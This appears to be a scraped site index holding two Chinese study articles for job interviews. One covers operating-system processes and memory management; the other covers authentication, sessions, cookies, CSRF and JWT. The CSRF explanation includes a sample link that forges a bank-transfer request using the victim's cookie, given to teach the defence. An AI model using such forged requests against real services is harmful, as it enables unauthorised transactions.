：又称为等待状态，进程正在等待某一事件而暂停运行如等待某资源为可用或等待 IO 操作完成。即使处理器空闲，该进程也不能运行。 结束状态(terminated) ：进程正在从系统中消失。可能是进程正常结束或其他原因中断退出运行。   订正：下图中 running 状态被 interrupt 向 ready 状态转换的箭头方向反了。\n 2.3 进程间的通信方式    👨‍💻面试官 ：进程间的通信常见的的有哪几种方式呢?\n🙋 我 ：大概有 7 种常见的进程间的通信方式。\n 下面这部分总结参考了:《进程间通信 IPC (InterProcess Communication)》 这篇文章，推荐阅读，总结的非常不错。\n  管道/匿名管道(Pipes) ：用于具有亲缘关系的父子进程间或者兄弟进程之间的通信。 有名管道(Names Pipes) : 匿名管道由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道。有名管道严格遵循先进先出(first in first out)。有名管道以磁盘文件的方式存在，可以实现本机任意两个进程通信。 信号(Signal) ：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生； 消息队列(Message Queuing) ：消息队列是消息的链表,具有特定的格式,存放在内存中并由消息队列标识符标识。管道和消息队列的通信数据都是先进先出的原则。与管道（无名管道：只存在于内存中的文件；命名管道：存在于实际的磁盘介质或者文件系统）不同的是消息队列存放在内核中，只有在内核重启(即，操作系统重启)或者显示地删除一个消息队列时，该消息队列才会被真正的删除。消息队列可以实现消息的随机查询,消息不一定要以先进先出的次序读取,也可以按消息的类型读取.比 FIFO 更有优势。消息队列克服了信号承载信息量少，管道只能承载无格式字 节流以及缓冲区大小受限等缺。 信号量(Semaphores) ：信号量是一个计数器，用于多进程对共享数据的访问，信号量的意图在于进程间同步。这种通信方式主要用于解决与同步相关的问题并避免竞争条件。 共享内存(Shared memory) ：使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据的更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。可以说这是最有用的进程间通信方式。 套接字(Sockets) : 此方法主要用于在客户端和服务器之间通过网络进行通信。套接字是支持 TCP/IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程。  2.4 线程间的同步的方式    👨‍💻面试官 ：那线程间的同步的方式有哪些呢?\n🙋 我 ：线程同步是两个或多个共享关键资源的线程的并发执行。应该同步线程以避免关键的资源使用冲突。操作系统一般有下面三种线程同步的方式：\n 互斥量(Mutex)：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问。比如 Java 中的 synchronized 关键词和各种 Lock 都是这种机制。 信号量(Semphares) ：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量 事件(Event) :Wait/Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操  2.5 进程的调度算法    👨‍💻面试官 ：你知道操作系统中进程的调度算法有哪些吗?\n🙋 我 ：嗯嗯！这个我们大学的时候学过，是一个很重要的知识点！\n为了确定首先执行哪个进程以及最后执行哪个进程以实现最大 CPU 利用率，计算机科学家已经定义了一些算法，它们是：\n 先到先服务(FCFS)调度算法 : 从就绪队列中选择一个最先进入该队列的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。 短作业优先(SJF)的调度算法 : 从就绪队列中选出一个估计运行时间最短的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。 时间片轮转调度算法 : 时间片轮转调度是一种最古老，最简单，最公平且使用最广的算法，又称 RR(Round robin)调度。每个进程被分配一个时间段，称作它的时间片，即该进程允许运行的时间。 多级反馈队列调度算法 ：前面介绍的几种进程调度的算法都有一定的局限性。如短进程优先的调度算法，仅照顾了短进程而忽略了长进程 。多级反馈队列调度算法既能使高优先级的作业得到响应又能使短作业（进程）迅速完成。，因而它是目前被公认的一种较好的进程调度算法，UNIX 操作系统采取的便是这种调度算法。 优先级调度 ： 为每个流程分配优先级，首先执行具有最高优先级的进程，依此类推。具有相同优先级的进程以 FCFS 方式执行。可以根据内存要求，时间要求或任何其他资源要求来确定优先级。  2.6 什么是死锁    👨‍💻面试官 ：你知道什么是死锁吗?\n🙋 我 ：多个进程可以竞争有限数量的资源。当一个进程申请资源时，如果这时没有可用资源，那么这个进程进入等待状态。有时，如果所申请的资源被其他等待进程占有，那么该等待进程有可能再也无法改变状态。这种情况成为死锁。\n2.7 死锁的四个条件    👨‍💻面试官 ：产生死锁的四个必要条件是什么?\n🙋 我 ：如果系统中以下四个条件同时成立，那么就能引起死锁：\n 互斥：资源必须处于非共享模式，即一次只有一个进程可以使用。如果另一进程申请该资源，那么必须等待直到该资源被释放为止。 占有并等待：一个进程至少应该占有一个资源，并等待另一资源，而该资源被其他进程所占有。 非抢占：资源不能被抢占。只能在持有资源的进程完成任务后，该资源才会被释放。 循环等待：有一组等待进程 {P0, P1,..., Pn}， P0 等待的资源被 P1 占有，P1 等待的资源被 P2 占有，\u0026hellip;\u0026hellip;，Pn-1 等待的资源被 Pn 占有，Pn 等待的资源被 P0 占有。  注意，只有四个条件同时成立时，死锁才会出现。\n三 操作系统内存管理基础    3.1 内存管理介绍    👨‍💻 面试官: 操作系统的内存管理主要是做什么？\n🙋 我： 操作系统的内存管理主要负责内存的分配与回收（malloc 函数：申请内存，free 函数：释放内存），另外地址转换也就是将逻辑地址转换成相应的物理地址等功能也是操作系统内存管理做的事情。\n3.2 常见的几种内存管理机制    👨‍💻 面试官: 操作系统的内存管理机制了解吗？内存管理有哪几种方式?\n🙋 我： 这个在学习操作系统的时候有了解过。\n简单分为连续分配管理方式和非连续分配管理方式这两种。连续分配管理方式是指为一个用户程序分配一个连续的内存空间，常见的如 块式管理 。同样地，非连续分配管理方式允许一个程序使用的内存分布在离散或者说不相邻的内存中，常见的如页式管理 和 段式管理。\n 块式管理 ： 远古时代的计算机操系统的内存管理方式。将内存分为几个固定大小的块，每个块中只包含一个进程。如果程序运行需要内存的话，操作系统就分配给它一块，如果程序运行只需要很小的空间的话，分配的这块内存很大一部分几乎被浪费了。这些在每个块中未被利用的空间，我们称之为碎片。 页式管理 ：把主存分为大小相等且固定的一页一页的形式，页较小，相对相比于块式管理的划分力度更大，提高了内存利用率，减少了碎片。页式管理通过页表对应逻辑地址和物理地址。 段式管理 ： 页式管理虽然提高了内存利用率，但是页式管理其中的页实际并无任何实际意义。 段式管理把主存分为一段段的，每一段的空间又要比一页的空间小很多 。但是，最重要的是段是有实际意义的，每个段定义了一组逻辑信息，例如,有主程序段 MAIN、子程序段 X、数据段 D 及栈段 S 等。 段式管理通过段表对应逻辑地址和物理地址。  👨‍💻面试官 ： 回答的还不错！不过漏掉了一个很重要的 段页式管理机制 。段页式管理机制结合了段式管理和页式管理的优点。简单来说段页式管理机制就是把主存先分成若干段，每个段又分成若干页，也就是说 段页式管理机制 中段与段之间以及段的内部的都是离散的。\n🙋 我 ：谢谢面试官！刚刚把这个给忘记了～\n3.3 快表和多级页表    👨‍💻面试官 ： 页表管理机制中有两个很重要的概念：快表和多级页表，这两个东西分别解决了页表管理中很重要的两个问题。你给我简单介绍一下吧！\n🙋 我 ：在分页内存管理中，很重要的两点是：\n 虚拟地址到物理地址的转换要快。 解决虚拟地址空间大，页表也会很大的问题。  快表    为了解决虚拟地址到物理地址的转换速度，操作系统在 页表方案 基础之上引入了 快表 来加速虚拟地址到物理地址的转换。我们可以把快表理解为一种特殊的高速缓冲存储器（Cache），其中的内容是页表的一部分或者全部内容。作为页表的 Cache，它的作用与页表相似，但是提高了访问速率。由于采用页表做地址转换，读写内存数据时 CPU 要访问两次主存。有了快表，有时只要访问一次高速缓冲存储器，一次主存，这样可加速查找并提高指令执行速度。\n使用快表之后的地址转换流程是这样的：\n 根据虚拟地址中的页号查快表； 如果该页在快表中，直接从快表中读取相应的物理地址； 如果该页不在快表中，就访问内存中的页表，再从页表中得到物理地址，同时将页表中的该映射表项添加到快表中； 当快表填满后，又要登记新页时，就按照一定的淘汰策略淘汰掉快表中的一个页。  看完了之后你会发现快表和我们平时经常在我们开发的系统使用的缓存（比如 Redis）很像，的确是这样的，操作系统中的很多思想、很多经典的算法，你都可以在我们日常开发使用的各种工具或者框架中找到它们的影子。\n多级页表    引入多级页表的主要目的是为了避免把全部页表一直放在内存中占用过多空间，特别是那些根本就不需要的页表就不需要保留在内存中。多级页表属于时间换空间的典型场景，具体可以查看下面这篇文章\n 多级页表如何节约内存：https://www.polarxiong.com/archives/多级页表如何节约内存.html  总结    为了提高内存的空间性能，提出了多级页表的概念；但是提到空间性能是以浪费时间性能为基础的，因此为了补充损失的时间性能，提出了快表（即 TLB）的概念。 不论是快表还是多级页表实际上都利用到了程序的局部性原理，局部性原理在后面的虚拟内存这部分会介绍到。\n3.4 分页机制和分段机制的共同点和区别    👨‍💻面试官 ： 分页机制和分段机制有哪些共同点和区别呢？\n🙋 我 ：\n 共同点 ：  分页机制和分段机制都是为了提高内存利用率，较少内存碎片。 页和段都是离散存储的，所以两者都是离散分配内存的方式。但是，每个页和段中的内存是连续的。   区别 ：  页的大小是固定的，由操作系统决定；而段的大小不固定，取决于我们当前运行的程序。 分页仅仅是为了满足操作系统内存管理的需求，而段是逻辑信息的单位，在程序中可以体现为代码段，数据段，能够更好满足用户的需要。    3.5 逻辑(虚拟)地址和物理地址    👨‍💻面试官 ：你刚刚还提到了逻辑地址和物理地址这两个概念，我不太清楚，你能为我解释一下不？\n🙋 我： em\u0026hellip;好的嘛！我们编程一般只有可能和逻辑地址打交道，比如在 C 语言中，指针里面存储的数值就可以理解成为内存里的一个地址，这个地址也就是我们说的逻辑地址，逻辑地址由操作系统决定。物理地址指的是真实物理内存中地址，更具体一点来说就是内存地址寄存器中的地址。物理地址是内存单元真正的地址。\n3.6 CPU 寻址了解吗?为什么需要虚拟地址空间?    👨‍💻面试官 ：CPU 寻址了解吗?为什么需要虚拟地址空间?\n🙋 我 ：这部分我真不清楚！\n于是面试完之后我默默去查阅了相关文档！留下了没有技术的泪水。。。\n 这部分内容参考了 Microsoft 官网的介绍，地址：https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/virtual-address-spaces?redirectedfrom=MSDN\n 现代处理器使用的是一种称为 虚拟寻址(Virtual Addressing) 的寻址方式。使用虚拟寻址，CPU 需要将虚拟地址翻译成物理地址，这样才能访问到真实的物理内存。 实际上完成虚拟地址转换为物理地址转换的硬件是 CPU 中含有一个被称为 内存管理单元（Memory Management Unit, MMU） 的硬件。如下图所示：\n为什么要有虚拟地址空间呢？\n先从没有虚拟地址空间的时候说起吧！没有虚拟地址空间的时候，程序都是直接访问和操作的都是物理内存 。但是这样有什么问题呢？\n 用户程序可以访问任意内存，寻址内存的每个字节，这样就很容易（有意或者无意）破坏操作系统，造成操作系统崩溃。 想要同时运行多个程序特别困难，比如你想同时运行一个微信和一个 QQ 音乐都不行。为什么呢？举个简单的例子：微信在运行的时候给内存地址 1xxx 赋值后，QQ 音乐也同样给内存地址 1xxx 赋值，那么 QQ 音乐对内存的赋值就会覆盖微信之前所赋的值，这就造成了微信这个程序就会崩溃。  总结来说：如果直接把物理地址暴露出来的话会带来严重问题，比如可能对操作系统造成伤害以及给同时运行多个程序造成困难。\n通过虚拟地址访问内存有以下优势：\n 程序可以使用一系列相邻的虚拟地址来访问物理内存中不相邻的大内存缓冲区。 程序可以使用一系列虚拟地址来访问大于可用物理内存的内存缓冲区。当物理内存的供应量变小时，内存管理器会将物理内存页（通常大小为 4 KB）保存到磁盘文件。数据或代码页会根据需要在物理内存与磁盘之间移动。 不同进程使用的虚拟地址彼此隔离。一个进程中的代码无法更改正在由另一进程或操作系统使用的物理内存。  四 虚拟内存    4.1 什么是虚拟内存(Virtual Memory)?    👨‍💻面试官 ：再问你一个常识性的问题！什么是虚拟内存(Virtual Memory)?\n🙋 我 ：这个在我们平时使用电脑特别是 Windows 系统的时候太常见了。很多时候我们使用点开了很多占内存的软件，这些软件占用的内存可能已经远远超出了我们电脑本身具有的物理内存。为什么可以这样呢？ 正是因为 虚拟内存 的存在，通过 虚拟内存 可以让程序可以拥有超过系统物理内存大小的可用内存空间。另外，虚拟内存为每个进程提供了一个一致的、私有的地址空间，它让每个进程产生了一种自己在独享主存的错觉（每个进程拥有一片连续完整的内存空间）。这样会更加有效地管理内存并减少出错。\n虚拟内存是计算机系统内存管理的一种技术，我们可以手动设置自己电脑的虚拟内存。不要单纯认为虚拟内存只是“使用硬盘空间来扩展内存“的技术。虚拟内存的重要意义是它定义了一个连续的虚拟地址空间，并且 把内存扩展到硬盘空间。推荐阅读：《虚拟内存的那点事儿》\n维基百科中有几句话是这样介绍虚拟内存的。\n 虚拟内存 使得应用程序认为它拥有连续的可用的内存（一个连续完整的地址空间），而实际上，它通常是被分隔成多个物理内存碎片，还有部分暂时存储在外部磁盘存储器上，在需要时进行数据交换。与没有使用虚拟内存技术的系统相比，使用这种技术的系统使得大型程序的编写变得更容易，对真正的物理内存（例如 RAM）的使用也更有效率。目前，大多数操作系统都使用了虚拟内存，如 Windows 家族的“虚拟内存”；Linux 的“交换空间”等。From:https://zh.wikipedia.org/wiki/虚拟内存\n 4.2 局部性原理    👨‍💻面试官 ：要想更好地理解虚拟内存技术，必须要知道计算机中著名的局部性原理。另外，局部性原理既适用于程序结构，也适用于数据结构，是非常重要的一个概念。\n🙋 我 ：局部性原理是虚拟内存技术的基础，正是因为程序运行具有局部性原理，才可以只装入部分程序到内存就开始运行。\n 以下内容摘自《计算机操作系统教程》 第 4 章存储器管理。\n 早在 1968 年的时候，就有人指出我们的程序在执行的时候往往呈现局部性规律，也就是说在某个较短的时间段内，程序执行局限于某一小部分，程序访问的存储空间也局限于某个区域。\n局部性原理表现在以下两个方面：\n 时间局部性 ：如果程序中的某条指令一旦执行，不久以后该指令可能再次执行；如果某数据被访问过，不久以后该数据可能再次被访问。产生时间局部性的典型原因，是由于在程序中存在着大量的循环操作。 空间局部性 ：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内，这是因为指令通常是顺序存放、顺序执行的，数据也一般是以向量、数组、表等形式簇聚存储的。  时间局部性是通过将近来使用的指令和数据保存到高速缓存存储器中，并使用高速缓存的层次结构实现。空间局部性通常是使用较大的高速缓存，并将预取机制集成到高速缓存控制逻辑中实现。虚拟内存技术实际上就是建立了 “内存一外存”的两级存储器的结构，利用局部性原理实现髙速缓存。\n4.3 虚拟存储器     勘误：虚拟存储器又叫做虚拟内存，都是 Virtual Memory 的翻译，属于同一个概念。\n 👨‍💻面试官 ：都说了虚拟内存了。你再讲讲虚拟存储器把！\n🙋 我 ：\n 这部分内容来自：王道考研操作系统知识点整理。\n 基于局部性原理，在程序装入时，可以将程序的一部分装入内存，而将其他部分留在外存，就可以启动程序执行。由于外存往往比内存大很多，所以我们运行的软件的内存大小实际上是可以比计算机系统实际的内存大小大的。在程序执行过程中，当所访问的信息不在内存时，由操作系统将所需要的部分调入内存，然后继续执行程序。另一方面，操作系统将内存中暂时不使用的内容换到外存上，从而腾出空间存放将要调入内存的信息。这样，计算机好像为用户提供了一个比实际内存大的多的存储器——虚拟存储器。\n实际上，我觉得虚拟内存同样是一种时间换空间的策略，你用 CPU 的计算时间，页的调入调出花费的时间，换来了一个虚拟的更大的空间来支持程序的运行。不得不感叹，程序世界几乎不是时间换空间就是空间换时间。\n4.4 虚拟内存的技术实现    👨‍💻面试官 ：虚拟内存技术的实现呢？\n🙋 我 ：虚拟内存的实现需要建立在离散分配的内存管理方式的基础上。 虚拟内存的实现有以下三种方式：\n 请求分页存储管理 ：建立在分页管理之上，为了支持虚拟存储器功能而增加了请求调页功能和页面置换功能。请求分页是目前最常用的一种实现虚拟存储器的方法。请求分页存储管理系统中，在作业开始运行之前，仅装入当前要执行的部分段即可运行。假如在作业运行的过程中发现要访问的页面不在内存，则由处理器通知操作系统按照对应的页面置换算法将相应的页面调入到主存，同时操作系统也可以将暂时不用的页面置换到外存中。 请求分段存储管理 ：建立在分段存储管理之上，增加了请求调段功能、分段置换功能。请求分段储存管理方式就如同请求分页储存管理方式一样，在作业开始运行之前，仅装入当前要执行的部分段即可运行；在执行过程中，可使用请求调入中断动态装入要访问但又不在内存的程序段；当内存空间已满，而又需要装入新的段时，根据置换功能适当调出某个段，以便腾出空间而装入新的段。 请求段页式存储管理  这里多说一下？很多人容易搞混请求分页与分页存储管理，两者有何不同呢？\n请求分页存储管理建立在分页管理之上。他们的根本区别是是否将程序全部所需的全部地址空间都装入主存，这也是请求分页存储管理可以提供虚拟内存的原因，我们在上面已经分析过了。\n它们之间的根本区别在于是否将一作业的全部地址空间同时装入主存。请求分页存储管理不要求将作业全部地址空间同时装入主存。基于这一点，请求分页存储管理可以提供虚存，而分页存储管理却不能提供虚存。\n不管是上面那种实现方式，我们一般都需要：\n 一定容量的内存和外存：在载入程序的时候，只需要将程序的一部分装入内存，而将其他部分留在外存，然后程序就可以执行了； 缺页中断：如果需执行的指令或访问的数据尚未在内存（称为缺页或缺段），则由处理器通知操作系统将相应的页面或段调入到内存，然后继续执行程序； 虚拟地址空间 ：逻辑地址到物理地址的变换。  4.5 页面置换算法    👨‍💻面试官 ：虚拟内存管理很重要的一个概念就是页面置换算法。那你说一下 页面置换算法的作用?常见的页面置换算法有哪些?\n🙋 我 ：\n 这个题目经常作为笔试题出现，网上已经给出了很不错的回答，我这里只是总结整理了一下。\n 地址映射过程中，若在页面中发现所要访问的页面不在内存中，则发生缺页中断 。\n 缺页中断 就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。 在这个时候，被内存映射的文件实际上成了一个分页交换文件。\n 当发生缺页中断时，如果当前内存中并没有空闲的页面，操作系统就必须在内存选择一个页面将其移出内存，以便为即将调入的页面让出空间。用来选择淘汰哪一页的规则叫做页面置换算法，我们可以把页面置换算法看成是淘汰页面的规则。\n OPT 页面置换算法（最佳页面置换算法） ：最佳(Optimal, OPT)置换算法所选择的被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面,这样可以保证获得最低的缺页率。但由于人们目前无法预知进程在内存下的若千页面中哪个是未来最长时间内不再被访问的，因而该算法无法实现。一般作为衡量其他置换算法的方法。 FIFO（First In First Out） 页面置换算法（先进先出页面置换算法） : 总是淘汰最先进入内存的页面，即选择在内存中驻留时间最久的页面进行淘汰。 LRU （Least Recently Used）页面置换算法（最近最久未使用页面置换算法） ：LRU算法赋予每个页面一个访问字段，用来记录一个页面自上次被访问以来所经历的时间 T，当须淘汰一个页面时，选择现有页面中其 T 值最大的，即最近最久未使用的页面予以淘汰。 LFU （Least Frequently Used）页面置换算法（最少使用页面置换算法） : 该置换算法选择在之前时期使用最少的页面作为淘汰页。  Reference     《计算机操作系统—汤小丹》第四版 《深入理解计算机系统》 https://zh.wikipedia.org/wiki/输入输出内存管理单元 https://baike.baidu.com/item/快表/19781679 https://www.jianshu.com/p/1d47ed0b46d5 https://www.studytonight.com/operating-system https://www.geeksforgeeks.org/interprocess-communication-methods/ https://juejin.im/post/59f8691b51882534af254317 王道考研操作系统知识点整理： https://wizardforcel.gitbooks.io/wangdaokaoyan-os/content/13.html  "},{"id":136,"href":"/system-design/authority-certification/basis-of-authority-certification/","title":"basis-of-authority-certification","parent":"authority-certification","content":"认证 (Authentication) 和授权 (Authorization)的区别是什么？    这是一个绝大多数人都会混淆的问题。首先先从读音上来认识这两个名词，很多人都会把它俩的读音搞混，所以我建议你先先去查一查这两个单词到底该怎么读，他们的具体含义是什么。\n说简单点就是：\n 认证 (Authentication)： 你是谁。 授权 (Authorization)： 你有权限干什么。  稍微正式点（啰嗦点）的说法就是 ：\n Authentication（认证） 是验证您的身份的凭据（例如用户名/用户 ID 和密码），通过这个凭据，系统得以知道你就是你，也就是说系统存在你这个用户。所以，Authentication 被称为身份/用户验证。 Authorization（授权） 发生在 Authentication（认证） 之后。授权嘛，光看意思大家应该就明白，它主要掌管我们访问系统的权限。比如有些特定资源只能具有特定权限的人才能访问比如 admin，有些对系统资源操作比如删除、添加、更新只能特定人才具有。  认证 ：\n授权：\n这两个一般在我们的系统中被结合在一起使用，目的就是为了保护我们系统的安全性。\nRBAC 模型了解吗？    系统权限控制最常采用的访问控制模型就是 RBAC 模型 。\n什么是 RBAC 呢？\nRBAC 即基于角色的权限访问控制（Role-Based Access Control）。这是一种通过角色关联权限，角色同时又关联用户的授权的方式。\n简单地说：一个用户可以拥有若干角色，每一个角色又可以被分配若干权限，这样就构造成“用户-角色-权限” 的授权模型。在这种模型中，用户与角色、角色与权限之间构成了多对多的关系，如下图\n在 RBAC 中，权限与角色相关联，用户通过成为适当角色的成员而得到这些角色的权限。这就极大地简化了权限的管理。\n本系统的权限设计相关的表如下（一共 5 张表，2 张用户建立表之间的联系）：\n通过这个权限模型，我们可以创建不同的角色并为不同的角色分配不同的权限范围（菜单）。\n通常来说，如果系统对于权限控制要求比较严格的话，一般都会选择使用 RBAC 模型来做权限控制。\n什么是 Cookie ? Cookie 的作用是什么?    Cookie 和 Session 都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。\n维基百科是这样定义 Cookie 的：\n Cookies 是某些网站为了辨别用户身份而储存在用户本地终端上的数据（通常经过加密）。\n 简单来说： Cookie 存放在客户端，一般用来保存用户信息。\n下面是 Cookie 的一些应用案例：\n 我们在 Cookie 中保存已经登录过的用户信息，下次访问网站的时候页面可以自动帮你登录的一些基本信息给填了。除此之外，Cookie 还能保存用户首选项，主题和其他设置信息。 使用 Cookie 保存 Session 或者 Token ，向后端发送请求的时候带上 Cookie，这样后端就能取到 Session 或者 Token 了。这样就能记录用户当前的状态了，因为 HTTP 协议是无状态的。 Cookie 还可以用来记录和分析用户行为。举个简单的例子你在网上购物的时候，因为 HTTP 协议是没有状态的，如果服务器想要获取你在某个页面的停留状态或者看了哪些商品，一种常用的实现方式就是将这些信息存放在 Cookie \u0026hellip;\u0026hellip;  如何在项目中使用 Cookie 呢？    我这里以 Spring Boot 项目为例。\n1)设置 Cookie 返回给客户端\n@GetMapping(\u0026#34;/change-username\u0026#34;) public String setCookie(HttpServletResponse response) { // 创建一个 cookie  Cookie cookie = new Cookie(\u0026#34;username\u0026#34;, \u0026#34;Jovan\u0026#34;); //设置 cookie过期时间  cookie.setMaxAge(7 * 24 * 60 * 60); // expires in 7 days  //添加到 response 中  response.addCookie(cookie); return \u0026#34;Username is changed!\u0026#34;; } 2) 使用 Spring 框架提供的 @CookieValue 注解获取特定的 cookie 的值\n@GetMapping(\u0026#34;/\u0026#34;) public String readCookie(@CookieValue(value = \u0026#34;username\u0026#34;, defaultValue = \u0026#34;Atta\u0026#34;) String username) { return \u0026#34;Hey! My username is \u0026#34; + username; } 3) 读取所有的 Cookie 值\n@GetMapping(\u0026#34;/all-cookies\u0026#34;) public String readAllCookies(HttpServletRequest request) { Cookie[] cookies = request.getCookies(); if (cookies != null) { return Arrays.stream(cookies) .map(c -\u0026gt; c.getName() + \u0026#34;=\u0026#34; + c.getValue()).collect(Collectors.joining(\u0026#34;, \u0026#34;)); } return \u0026#34;No cookies\u0026#34;; } 更多关于如何在 Spring Boot 中使用 Cookie 的内容可以查看这篇文章：How to use cookies in Spring Boot 。\nCookie 和 Session 有什么区别？    Session 的主要作用就是通过服务端记录用户的状态。 典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了。\nCookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。相对来说 Session 安全性更高。如果使用 Cookie 的一些敏感信息不要写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。\n那么，如何使用 Session 进行身份验证？\n如何使用 Session-Cookie 方案进行身份验证？    很多时候我们都是通过 SessionID 来实现特定的用户，SessionID 一般会选择存放在 Redis 中。举个例子：\n 用户成功登陆系统，然后返回给客户端具有 SessionID 的 Cookie 当用户向后端发起请求的时候会把 SessionID 带上，这样后端就知道你的身份状态了。  关于这种认证方式更详细的过程如下：\n 用户向服务器发送用户名、密码、验证码用于登陆系统。 服务器验证通过后，服务器为用户创建一个 Session，并将 Session 信息存储起来。 服务器向用户返回一个 SessionID，写入用户的 Cookie。 当用户保持登录状态时，Cookie 将与每个后续请求一起被发送出去。 服务器可以将存储在 Cookie 上的 SessionID 与存储在内存中或者数据库中的 Session 信息进行比较，以验证用户的身份，返回给用户客户端响应信息的时候会附带用户当前的状态。  使用 Session 的时候需要注意下面几个点：\n 依赖 Session 的关键业务一定要确保客户端开启了 Cookie。 注意 Session 的过期时间。  另外，Spring Session 提供了一种跨多个应用程序或实例管理用户会话信息的机制。如果想详细了解可以查看下面几篇很不错的文章：\n Getting Started with Spring Session Guide to Spring Session Sticky Sessions with Spring Session \u0026amp; Redis  多服务器节点下 Session-Cookie 方案如何做？    Session-Cookie 方案在单体环境是一个非常好的身份认证方案。但是，当服务器水平拓展成多节点时，Session-Cookie 方案就要面临挑战了。\n举个例子：假如我们部署了两份相同的服务 A，B，用户第一次登陆的时候 ，Nginx 通过负载均衡机制将用户请求转发到 A 服务器，此时用户的 Session 信息保存在 A 服务器。结果，用户第二次访问的时候 Nginx 将请求路由到 B 服务器，由于 B 服务器没有保存 用户的 Session 信息，导致用户需要重新进行登陆。\n我们应该如何避免上面这种情况的出现呢？\n有几个方案可供大家参考：\n 某个用户的所有请求都通过特性的哈希策略分配给同一个服务器处理。这样的话，每个服务器都保存了一部分用户的 Session 信息。服务器宕机，其保存的所有 Session 信息就完全丢失了。 每一个服务器保存的 Session 信息都是互相同步的，也就是说每一个服务器都保存了全量的 Session 信息。每当一个服务器的 Session 信息发生变化，我们就将其同步到其他服务器。这种方案成本太大，并且，节点越多时，同步成本也越高。 单独使用一个所有服务器都能访问到的数据节点（比如缓存）来存放 Session 信息。为了保证高可用，数据节点尽量要避免是单点。  如果没有 Cookie 的话 Session 还能用吗？    这是一道经典的面试题！\n一般是通过 Cookie 来保存 SessionID ，假如你使用了 Cookie 保存 SessionID 的方案的话， 如果客户端禁用了 Cookie，那么 Session 就无法正常工作。\n但是，并不是没有 Cookie 之后就不能用 Session 了，比如你可以将 SessionID 放在请求的 url 里面https://javaguide.cn/?Session_id=xxx 。这种方案的话可行，但是安全性和用户体验感降低。当然，为了你也可以对 SessionID 进行一次加密之后再传入后端。\n为什么 Cookie 无法防止 CSRF 攻击，而 Token 可以？    **CSRF（Cross Site Request Forgery）**一般被翻译为 跨站请求伪造 。那么什么是 跨站请求伪造 呢？说简单用你的身份去发送一些对你不友好的请求。举个简单的例子：\n小壮登录了某网上银行，他来到了网上银行的帖子区，看到一个帖子下面有一个链接写着“科学理财，年盈利率过万”，小壮好奇的点开了这个链接，结果发现自己的账户少了 10000 元。这是这么回事呢？原来黑客在链接中藏了一个请求，这个请求直接利用小壮的身份给银行发送了一个转账请求,也就是通过你的 Cookie 向银行发出请求。\n\u0026lt;a src=http://www.mybank.com/Transfer?bankId=11\u0026amp;money=10000\u0026gt;科学理财，年盈利率过万\u0026lt;/\u0026gt; 上面也提到过，进行 Session 认证的时候，我们一般使用 Cookie 来存储 SessionId,当我们登陆后后端生成一个 SessionId 放在 Cookie 中返回给客户端，服务端通过 Redis 或者其他存储工具记录保存着这个 SessionId，客户端登录以后每次请求都会带上这个 SessionId，服务端通过这个 SessionId 来标示你这个人。如果别人通过 Cookie 拿到了 SessionId 后就可以代替你的身份访问系统了。\nSession 认证中 Cookie 中的 SessionId 是由浏览器发送到服务端的，借助这个特性，攻击者就可以通过让用户误点攻击链接，达到攻击效果。\n但是，我们使用 Token 的话就不会存在这个问题，在我们登录成功获得 Token 之后，一般会选择存放在 localStorage （浏览器本地存储）中。然后我们在前端通过某些方式会给每个发到后端的请求加上这个 Token,这样就不会出现 CSRF 漏洞的问题。因为，即使有个你点击了非法链接发送了请求到服务端，这个非法请求是不会携带 Token 的，所以这个请求将是非法的。\n需要注意的是不论是 Cookie 还是 Token 都无法避免 跨站脚本攻击（Cross Site Scripting）XSS 。\n 跨站脚本攻击（Cross Site Scripting）缩写为 CSS 但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为 XSS。\n XSS 中攻击者会用各种方式将恶意代码注入到其他用户的页面中。就可以通过脚本盗用信息比如 Cookie 。\n推荐阅读：如何防止 CSRF 攻击？—美团技术团队\n什么是 Token?什么是 JWT?    我们在前面的问题中探讨了使用 Session 来鉴别用户的身份，并且给出了几个 Spring Session 的案例分享。 我们知道 Session 信息需要保存一份在服务器端。这种方式会带来一些麻烦，比如需要我们保证保存 Session 信息服务器的可用性、不适合移动端（依赖 Cookie）等等。\n有没有一种不需要自己存放 Session 信息就能实现身份验证的方式呢？使用 Token 即可！JWT （JSON Web Token） 就是这种方式的实现，通过这种方式服务器端就不需要保存 Session 数据了，只用在客户端保存服务端返回给客户的 Token 就可以了，扩展性得到提升。\nJWT 本质上就一段签名的 JSON 格式的数据。由于它是带有签名的，因此接收者便可以验证它的真实性。\n下面是 RFC 7519 对 JWT 做的较为正式的定义。\n JSON Web Token (JWT) is a compact, URL-safe means of representing claims to be transferred between two parties. The claims in a JWT are encoded as a JSON object that is used as the payload of a JSON Web Signature (JWS) structure or as the plaintext of a JSON Web Encryption (JWE) structure, enabling the claims to be digitally signed or integrity protected with a Message Authentication Code (MAC) and/or encrypted. ——JSON Web Token (JWT)\n JWT 由 3 部分构成:\n Header : 描述 JWT 的元数据，定义了生成签名的算法以及 Token 的类型。 Payload : 用来存放实际需要传递的数据 Signature（签名） ：服务器通过Payload、Header和一个密钥(secret)使用 Header 里面指定的签名算法（默认是 HMAC SHA256）生成。  